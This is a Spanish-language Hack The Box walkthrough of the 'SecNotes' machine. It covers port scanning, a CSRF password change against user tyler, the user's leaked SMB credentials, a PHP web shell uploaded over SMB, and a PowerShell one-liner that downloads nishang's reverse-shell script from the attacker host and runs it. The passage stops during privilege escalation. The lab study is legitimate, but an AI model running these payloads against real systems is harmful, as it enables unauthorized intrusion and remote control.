<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-secnotes-writeup">Hack The Box: SecNotes Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;SecNotes&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.18.0 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.18.0 -&gt; <span style="color:#f92672">[</span>80,445,8808<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p80,445,8808 -sCV 10.129.18.0 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-14 15:10 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.18.0
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE      VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http         Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>| http-title: Secure Notes - Login
</span></span><span style="display:flex;"><span>|_Requested resource was login.php
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds Windows <span style="color:#ae81ff">10</span> Enterprise <span style="color:#ae81ff">17134</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: HTB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>8808/tcp open  http         Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>|_http-title: IIS Windows
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb-security-mode: 
</span></span><span style="display:flex;"><span>|   account_used: &lt;blank&gt;
</span></span><span style="display:flex;"><span>|   authentication_level: user
</span></span><span style="display:flex;"><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| smb-os-discovery: 
</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">10</span> Enterprise <span style="color:#ae81ff">17134</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">10</span> Enterprise 6.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_10::-
</span></span><span style="display:flex;"><span>|   Computer name: SECNOTES
</span></span><span style="display:flex;"><span>|   NetBIOS computer name: SECNOTES<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|   Workgroup: HTB<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|_  System time: 2024-08-14T04:11:27-07:00
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 20m32s, deviation: 4h02m31s, median: -1h59m29s
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-08-14T11:11:25
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 52.61 seconds
</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> 10.129.18.0 -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-14 15:13 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.18.0
</span></span><span style="display:flex;"><span>Host is up.
</span></span><span style="display:flex;"><span>All <span style="color:#ae81ff">1500</span> scanned ports on 10.129.18.0 are in ignored states.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1500</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.39 seconds
</span></span></code></pre></div><h1 id="http-enumeration">HTTP Enumeration</h1>
<p>Hay pocos vectores de ataque y como por SMB no consigo nada..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ smbclient -L <span style="color:#ae81ff">\\</span>10.129.18.0 -U <span style="color:#e6db74">&#39;&#39;</span> -N
</span></span><span style="display:flex;"><span>session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ smbmap -H 10.129.18.0 -u <span style="color:#e6db74">&#39;null&#39;</span> -p <span style="color:#e6db74">&#39;null&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Authentication error on 10.129.18.0
</span></span></code></pre></div><p>Vamos a empezar con el puerto 80/TCP</p>
<p>Vemos un recurso <code>login.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://10.129.18.0
</span></span><span style="display:flex;"><span>http://10.129.18.0 <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Cookies<span style="color:#f92672">[</span>PHPSESSID<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.18.0<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>, PHP<span style="color:#f92672">[</span>7.2.7<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>login.php<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>PHP/7.2.7<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>http://10.129.18.0/login.php <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Bootstrap<span style="color:#f92672">[</span>3.3.7<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.18.0<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>, PHP<span style="color:#f92672">[</span>7.2.7<span style="color:#f92672">]</span>, PasswordField<span style="color:#f92672">[</span>password<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Secure Notes - Login<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>PHP/7.2.7<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Con la siguiente pinta.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Si nos creamos una cuenta, podemos ver lo siguiente.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Encontramos un Reflected XSS en las notas ya que este se guarda en las notas del usuario.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>En el campo de contacto podemos enviar un mensaje a <code>tyler</code>.
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Si le mandamos una dirección URL, parece que <code>tyler</code> la abre..
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<h2 id="updating-tyler-password--csrf">Updating Tyler password | CSRF</h2>
<p>Comprobando la funcionalidad para cambiar la contraseña, vemos que se envía una solicitud POST a <code>change_pass.php</code>
<img src="images/Screenshot_7.png" alt="Write-up Image"><img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Pero si intentamos cambiar la solicitud a GET..
<img src="images/Screenshot_9.png" alt="Write-up Image">
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>¡La credencial también se cambia!</p>
<p>A esto se le conoce como HTTP Method Confusion, y esto puede llevar a un CSRF.</p>
<p>Podemos ver que para cambiar la contraseña no hay ningún token CSRF y además si recordamos, <code>tyler</code> abría los links que le adjuntamos en el formulario de contacto&hellip;</p>
<p>Le pasamos esta URL formulada para cambiar la contraseña de <code>tyler</code> a <code>pointedsec</code>&hellip;
<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Y podemos iniciar sesión como <code>tyler</code>
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>Encontramos lo que parece credenciales para acceder a un recurso compartido a nivel de red.
<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
<p>Con <code>netexec</code> podemos comprobar si son válidas&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.18.0 -u <span style="color:#e6db74">&#39;tyler&#39;</span> -p <span style="color:#e6db74">&#39;92g!mA8BGjOirkL%OG*&amp;&#39;</span>
</span></span><span style="display:flex;"><span>SMB         10.129.18.0     <span style="color:#ae81ff">445</span>    SECNOTES         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Enterprise <span style="color:#ae81ff">17134</span> <span style="color:#f92672">(</span>name:SECNOTES<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:SECNOTES<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.18.0     <span style="color:#ae81ff">445</span>    SECNOTES         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SECNOTES<span style="color:#ae81ff">\t</span>yler:92g!mA8BGjOirkL%OG*&amp;
</span></span></code></pre></div><h1 id="foothold">Foothold</h1>
<p>Podemos ver los recursos compartidos a nivel de red a los que puede acceder este usuario y vemos que tiene permisos de lectura y escritura para <code>new-site</code>
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Vemos algunos recursos típicos de un IIS.
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p>Por el puerto 8808/TCP encontramos lo siguiente..
<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
<p>Vamos a probar a subir un archivo y ver si se ve reflejado en este servicio web.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;test&#34;</span> &gt; test.txt
</span></span></code></pre></div><p>Y ahora con <code>smbclient</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> put test.txt
</span></span><span style="display:flex;"><span>putting file test.txt as <span style="color:#ae81ff">\t</span>est.txt <span style="color:#f92672">(</span>0,0 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0,0 kb/s<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y efectivamente, se ve reflejado.
<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
<p>Vamos a ver si se interpreta código PHP en este sitio web..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; info.php
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/secnotes/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ smbclient <span style="color:#ae81ff">\\\\</span>10.129.18.0<span style="color:#ae81ff">\\</span>new-site -U <span style="color:#e6db74">&#39;tyler%92g!mA8BGjOirkL%OG*&amp;&#39;</span>
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> put info.php
</span></span><span style="display:flex;"><span>putting file info.php as <span style="color:#ae81ff">\i</span>nfo.php <span style="color:#f92672">(</span>0,2 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0,2 kb/s<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y vemos que si, ahora solo quedaría subirnos una web shell.
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Podemos comprobar que no hay ninguna <code>disable_functions</code>
<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
<p>Creamos una web shell sencilla&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>
</span></span></code></pre></div><p>La subimos&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> put shell.php
</span></span><span style="display:flex;"><span>putting file shell.php as <span style="color:#ae81ff">\s</span>hell.php <span style="color:#f92672">(</span>0,6 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0,6 kb/s<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>¡Y tenemos ejecución remota de comandos!
<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
<p>Ahora con el script <code>Invoke-PowerShellTcp.ps1</code> de <code>nishang</code> vamos a ganar acceso a la máquina.</p>
<p>Nos copiamos el script y le añadimos esta línea a lo último.</p>
<p><img src="images/Screenshot_21.png" alt="Write-up Image"></p>
<p>Ahora servimos el script por el puerto 8081.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
</span></span></code></pre></div><p>Nos ponemos en escucha con <code>netcat</code> por el puerto 443.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span></code></pre></div><p>Y ejecutamos este one-liner a través de la web shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>echo IEX(New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://10.10.14.85:8081/Invoke-PowerShellTcp.ps1&#39;</span>) | powershell -noprofile -
</span></span></code></pre></div><p><img src="images/Screenshot_22.png" alt="Write-up Image"></p>
<p>Y ganamos acceso a la máquina víctima</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.85<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.18.0<span style="color:#f92672">]</span> <span style="color:#ae81ff">59765</span>
</span></span><span style="display:flex;"><span>Windows PowerShell running as user SECNOTES$ on SECNOTES
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\n</span>ew-site&gt;whoami
</span></span><span style="display:flex;"><span>secnotes<span style="color:#ae81ff">\t</span>yler
</span></span></code></pre></div><p>Y podemos leer la flag de usuario.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\tyler\Desktop&gt; type user.txt
</span></span><span style="display:flex;"><span>e175f96d71f268b1...
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Según vemos la flag, nos llama la atención un acceso directo.</p>
<p><img src="images/Screenshot_23.png" alt="Write-up Image"></p>
<p>¿bash? Pero si estamos en Windows.</p>
<p>También podemos detectar un directorio <code>Distros</code> en la raíz del sistema.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Distros&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Distros
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                  
</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                  
</span></span><span style="display:flex;"><span>d-----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span> PM                Ubuntu
</span></span></code></pre></div><p>Podemos deducir que va a entrar en juego WSL (Windows Subsystem for Linux), una manera de poder tener tu sistema operativo Linux dentro de tu máquina Windows.</p>
<p>Entonces vamos a explorar los archivos de este subsistema ya que se tienen que guardar en alguna parte del disco duro, ¿no?</p>
<p>Buscando un poco en Google nos encontramos con alguien que se preguntó lo mismo hace muchos años.
<a href="https://superuser.com/questions/1185033/what-is-the-home-directory-on-windows-subsystem-for-linux">https://superuser.com/questions/1185033/what-is-the-home-directory-on-windows-subsystem-for-linux</a></p>
<p>Y con esta respuesta.
<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
<p>Y efectivamente, aquí se encuentra el subsistema linux.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> 
</span></span><span style="display:flex;"><span>    C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                  
</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                  
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span> PM                bin                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                boot                                                                  
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                dev                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">22</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> AM                etc                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                home                                                                  
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                lib                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                lib64                                                                 
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                media                                                                 
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span> PM                mnt                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                opt                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                proc                                                                  
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">22</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">44</span> PM                root                                                                  
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                run                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">22</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">57</span> AM                sbin                                                                  
